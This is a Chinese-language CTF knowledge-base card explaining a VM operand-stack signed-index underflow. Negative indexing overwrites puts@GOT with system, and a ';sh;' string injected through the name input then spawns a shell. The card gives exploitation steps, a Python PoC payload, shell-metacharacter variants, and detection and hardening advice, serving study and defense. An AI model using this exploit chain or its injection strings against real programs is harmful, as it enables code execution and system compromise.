---
id: ctf-pwn-vm-stack-index-signed-underflow-got-system
title: VM 操作数栈索引有符号下溢：负下标从 .bss 栈反向覆写 puts@GOT 为 system
type: scenario
domain: ctf
path: ctf/pwn
technique: vm-stack-index-signed-underflow-negative-got-hijack-system
tags:
- pwn
- vm
- virtual-machine
- operand-stack
- signed-index
- underflow
- out-of-bounds-write
- got-hijack
- system
- partial-write
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V177
  verified_at: '2026-11-06T17:21:42+08:00'
  notes: 已对照原文核对；exp 未在本机复跑
url: /docs/ctf/pwn/ctf-pwn-vm-stack-index-signed-underflow-got-system/
draft: false
kb_aliases:
- sp指针溢出修改got表
- VM 负下标写 GOT
- stack index underflow
- VM 栈下溢
- puts@GOT 改 system
- 2025moe pwn16
---

## 一句话结论

VM 的操作数栈 `stack[]` 放在 `.bss` 且紧邻 GOT，`getopcode` 只检查 `index > 256` 的上界、pop 的 `index--` 没有下界检查；连续 pop 把有符号 `index` 降到负数后，push 的 `stack[++index] = reg` 就落到 `puts@GOT`（距栈基址 -0x90），再从该 GOT 读出原有 libc 指针减去固定偏移得到 `system`，把低 32 位写回 `puts@GOT`；随后程序用 `sprintf` 拼出含 `;sh;` 的字符串并调用 `puts`，实际执行 `system("...;sh;...")` 拿到 shell。

## 原理

- **内存布局**：`.bss` 中 `stack` 数组基址为 `0x403480`，GOT 项 `puts@GOT` 在 `0x4033f0`，二者相差 `0x90`，即 18 个 8 字节栈槽；`stack[-18]` 正好覆盖 `puts@GOT`。程序为 No RELRO、非 PIE，GOT 可写且地址固定。
- **索引检查缺口**：解析函数只做 `opcode <= 0xA`、`reg1/reg2 <= 0xA` 与 `index <= 256` 的上界检查；源码中 `(unsigned int)index` 的强转没有形成有效的下界判断，负值仍能通过（exp 用 20 次 pop 把 index 降到 -19 后继续执行 push 可证）。pop 分支 `v1 = index--` 在 index 为 0 时也不拦截，直接继续减到负值。
- **负下标写**：push 分支是 `LODWORD(stack[++index]) = rgs[rgs1]`，即每次只写目标槽的低 4 字节。当 index 为 -19 时 `++index` 得 -18，命中 `stack[-18] = 0x4033f0`，也就是 `puts@GOT` 的低 32 位。
- **不用泄露 libc 的偏移计算**：pop 一次即可把 `stack[-18]` 的当前值（运行时已解析的 `puts` 真实地址）读进寄存器；libc 版本固定，`system = puts - 0x300e0`（本题用 5×0x9999 + 0x53 + 0x90 凑出该差值）。因此不需要 `%p`/输出泄露，只依赖同一 libc 内两个符号的固定距离。
- **写回与触发**：把算出的 system 低 32 位 push 回 `stack[-18]`，覆盖 `puts@GOT`。之后 `main` 用真正的 `sprintf(s, "Goodbye,%s,see you next time ~", ptr)` 生成字符串，其中 `%s` 来自用户输入的 name；紧接着 `puts(s)` 已被改成 `system(s)`，字符串里的 ` ;sh;` 被 shell 当作命令分隔后的 `sh` 执行。

## 触发条件

- VM 操作数栈位于 `.bss`/`.data`，与 GOT、函数指针表或其他敏感全局变量相邻，且距离落在负索引可达范围内。
- 索引为有符号整数，检查只覆盖上界（或检查代码存在有符号/无符号比较不一致），pop/dec 路径没有下界保护。
- 目标为 Partial/No RELRO 且非 PIE，GOT 可写；或能找到其他可写的间接调用目标。
- 存在把用户可控字符串交给已被劫持 GOT 函数的调用点（本题 `puts(s)`），且字符串中可注入 shell 元字符。

## 利用步骤

1. 逆向指令编码：本题指令为 `opcode<<48 | rgs1<<32 | rgs2<<16 | imm`（opcode 16 位、rgs1/rgs2 各 8 位、imm 16 位），写 `code(op, r1, r2, imm)` 编码器。
2. 确认 `stack` 基址与 GOT 地址：`stack=0x403480`、`puts@GOT=0x4033f0`，差值 `0x90` 对应 `index=-18`；确认索引检查确实放过负值。
3. 先用一条 `push imm` 把 index 置为 1，再执行 19 次 `pop r0` 把 index 降到 -18（第 19 次读的是 `stack[-18]` 的前一槽，不破坏目标）；第 20 次 `pop r2` 读出 `puts@GOT` 的值到寄存器。
4. 在寄存器中减去 `0x300e0` 得到 `system`：用 `sub reg, reg, imm` 分多次减（本题 5×0x9999 + 0x53 + 0x90），避免 16 位立即数越界。
5. 执行 `push r2`，`++index` 回到 -18，把 system 的低 32 位写进 `puts@GOT`。
6. 在 name 输入中填入 ` ;sh;`；VM 结束后 `sprintf` 把它嵌入 `Goodbye, ;sh;,see you next time ~`，被劫持的 `puts` 以 `system` 执行，`;sh;` 启动 shell。

## PoC

指令编码与关键序列（未在本机复跑；地址按本题布局）：

```python
def code(op, r1, r2, imm):
    return ((op & 0xFFFF) << 48) | ((r1 & 0xFF) << 32) | ((r2 & 0xFF) << 16) | (imm & 0xFFFF)

payload = b''
payload += p64(code(0, 0, 0, 6))          # push 6 -> index=1
payload += p64(code(1, 0, 0, 0)) * 19     # pop r0 x19 -> index=-18
payload += p64(code(1, 2, 0, 0))          # pop r2 -> r2 = stack[-18] = puts@GOT
# system = puts - 0x300E0 = puts - (5*0x9999 + 0x53 + 0x90)
payload += p64(code(5, 2, 2, 0x9999)) * 5 # r2 = r2 - 0x9999 * 5
payload += p64(code(5, 2, 2, 0x53))       # r2 = r2 - 0x53
payload += p64(code(5, 2, 2, 0x90))       # r2 = r2 - 0x90
payload += p64(code(8, 2, 0, 0))          # push r2 -> stack[-18] = system

io.sendline(b' ;sh;')                      # name 中的 shell 注入串
io.sendlineafter(b'Input your opcode', payload)
```

注意：`LODWORD` 只写低 4 字节，因此要求目标 libc 的 `system` 与 `puts` 高 32 位相同（同一映射内通常成立）；64 位地址高位保持不变。

## 变体与关联

- **索引方向变体**：除负下标外，unsigned 索引从 0 自减可回绕到 `0xffffffff` 形成远端写；`index++` 在数组末尾也能向上覆盖后续全局变量。
- **目标变体**：若 GOT 不在负索引窗口内，可改打相邻函数指针、`__malloc_hook`/`__free_hook`（旧 glibc）、命令缓冲区；GOT 打哪个函数取决于哪个调用点可控参数（如 `puts`/`printf`/`free`）。
- **触发串变体**：`;sh;`、`|sh|`、`$(sh)` 等可嵌入格式化字符串的 shell 元字符；若 sink 是 `system(cmd)` 可直接写完整命令。
- **关联卡片**：[[ctf-pwn-vm-operand-stack-index-unbounded-push-canary-leak-orw-rop]]（同篇文章的栈帧上越界变体）、[[ctf-pwn-custom-vm-opcode-native-memory-got-restart-onegadget]]（VM 任意内存原语改 GOT）、[[ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system]]（普通数组负下标覆写 puts@GOT 的同类链）。

## 检测与防御

- **索引双边界检查**：push/pop 在访问前同时验证 `index >= 0` 与 `index < ARRAY_LEN`；不要依赖 `(unsigned int)` 强转来“修正”负数，也不要在自增/自减后才检查。
- **布局隔离**：VM 操作数栈与 GOT、函数指针、命令缓冲区分属不同段/页，敏感全局变量加只读或 canary 保护。
- **二进制加固**：Full RELRO 使 GOT 只读、PIE 打乱地址；对间接调用点做完整性校验。
- **sink 加固**：不要把用户可控字符串交给 `system`/`popen`；用固定程序与参数数组，过滤 shell 元字符。
- **检测特征**：VM 字节码中出现大量 pop 后紧接 push、index 变为负值；程序运行时 `puts@GOT` 等 GOT 项被改写为 libc 内非原函数地址；进程出现异常 `sh` 子进程。
